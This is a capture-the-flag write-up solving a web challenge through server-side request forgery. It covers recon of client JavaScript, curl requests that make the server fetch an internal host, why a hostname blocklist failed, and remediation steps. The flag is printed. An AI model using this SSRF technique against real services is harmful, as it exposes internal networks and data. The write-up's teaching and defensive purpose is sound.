# boro-senpai 2 — SSRF Writeup

**CTF:** boroCTF 2026
**Challenge:** boro-senpai 2
**Category:** Web
**Points:** 200

---

## Challenge Description

> Maine's dead. Lucy's gone dark. David... you know what happened.
>
> You're the last one standing with a half-finished contract and nothing left to lose.
>
> Arasaka's internal data relay is locked behind a blocklist — but their own NetPulse uptime checker is still live on the public net.
>
> Plug in. Pull the flag. Get out.

The challenge presented a Cyberpunk-themed web application called **NetPulse**, an uptime-checking service capable of fetching user-supplied URLs.

---

## Attack Surface

The application exposed a single feature:

```text
URL Input → Backend Fetch → Response Returned
```

Whenever a server retrieves user-controlled URLs, **Server-Side Request Forgery (SSRF)** immediately becomes a potential attack vector.

---

## Reconnaissance

### Inspecting Client-Side JavaScript

Reviewing the application's JavaScript revealed the backend API endpoint:

```javascript
const res = await fetch('/api/pulse', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ url }),
});
```

More importantly, a developer comment exposed internal infrastructure details:

```javascript
// NOTE FOR DEVS: diagnostic probe routes through the proxy service.
// Internal nodes on mainframe-net (e.g. internal-api) are supposed to be
// shielded by the perimeter blocklist. Double-check filter coverage before prod.
```

This immediately revealed:

* The existence of an internal hostname: `internal-api`
* The presence of a proxy service
* Reliance on a hostname-based blocklist

At this point, SSRF became the most likely intended vulnerability.

---

## Confirming SSRF

The endpoint accepted arbitrary URLs:

```bash
curl -s -X POST https://4imc7nitr7ln.boroctf.com/api/pulse \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-api"}'
```

Response:

```json
{
  "body": "{\"endpoints\":[\"/\",\"/flag\"],\"node\":\"internal-api\",\"notice\":\"CLASSIFIED — INTERNAL NETWORK ONLY\",\"status\":\"operational\"}",
  "status": 200
}
```

Success.

The application fetched an internal service that should not have been reachable from the internet.

Even better, the service helpfully disclosed its available endpoints:

```text
/
/flag
```

---

## Exploitation

With SSRF confirmed, retrieving the flag became trivial.

```bash
curl -s -X POST https://4imc7nitr7ln.boroctf.com/api/pulse \
  -H "Content-Type: application/json" \
  -d '{"url":"http://internal-api/flag"}'
```

Response:

```json
{
  "classification":"TOP SECRET",
  "flag":"boroCTF{w1sh_w3_c0uld_g0_2_th3_m00n_t0g3th3r}",
  "message":"MAINFRAME BREACH CONFIRMED — CLASSIFIED DATA EXFILTRATED"
}
```

Flag obtained.

---

## Why The Blocklist Failed

The application attempted to block requests to obvious local targets such as:

```text
127.0.0.1
localhost
::1
10.0.0.0/8
192.168.0.0/16
```

However, it failed to account for internal DNS hostnames.

Example:

```text
http://internal-api
```

The hostname was accepted by the filter.

Only after validation did DNS resolution occur:

```text
internal-api
        ↓
172.x.x.x
        ↓
Internal Service
```

By the time the hostname resolved to a private IP address, the security checks had already been bypassed.

---

## SSRF Attack Flow

```text
Attacker
    ↓
POST /api/pulse
    ↓
URL = http://internal-api/flag
    ↓
Backend Fetches URL
    ↓
DNS Resolves Internal Host
    ↓
Internal Service Responds
    ↓
Flag Returned To User
```

---

## Vulnerability Summary

The challenge contained a classic SSRF vulnerability:

```text
User Input
      ↓
Server-Side Request
      ↓
Internal Network Access
      ↓
Sensitive Data Exposure
```

Root cause:

* Trusting user-supplied URLs
* Insufficient hostname validation
* Filtering before DNS resolution
* Leaking internal hostnames in client-side code

---

## Flag

```text
boroCTF{w1sh_w3_c0uld_g0_2_th3_m00n_t0g3th3r}
```

---

## Remediation

A proper SSRF defense should:

1. Use strict allowlists rather than blocklists.
2. Resolve hostnames before validation.
3. Block private, loopback, and link-local ranges.
4. Route outbound requests through controlled egress proxies.
5. Avoid exposing internal infrastructure details in client-side code.

Example:

```python
import socket
import ipaddress

host = extract_hostname(url)
ip = socket.gethostbyname(host)

if ipaddress.ip_address(ip).is_private:
    raise ValueError("Blocked")
```

---

## Lessons Learned

* Client-side JavaScript often leaks valuable infrastructure information.
* Internal hostnames can be as dangerous as exposed IP addresses.
* SSRF protections must validate the final resolved IP address.
* Blocklists are frequently bypassed; allowlists are safer.
* Many SSRF challenges can be solved entirely through careful reconnaissance before any exploitation takes place.

---

## Tools Used

* Browser DevTools
* curl
* Manual HTTP testing

---

## References

* OWASP SSRF Prevention Cheat Sheet
* PortSwigger SSRF Academy
* HackTricks SSRF Methodology

